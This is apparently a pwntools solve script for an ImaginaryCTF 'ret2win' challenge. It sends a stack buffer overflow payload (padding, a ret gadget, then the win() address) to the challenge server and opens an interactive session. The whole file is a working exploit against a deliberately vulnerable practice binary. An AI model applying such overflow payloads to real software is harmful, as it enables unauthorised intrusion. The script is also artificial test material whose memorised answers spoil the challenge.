from pwn import *
#r = process('/tmp/vuln')
r = remote('ret2win.chal.imaginaryctf.org', 1337)
payload = b'a' * (0x40 + 8) + p64(0x000000000040101a) + p64(0x000000000040117a) # 'ret' gadget, then win()
r.sendline(payload)
r.interactive()
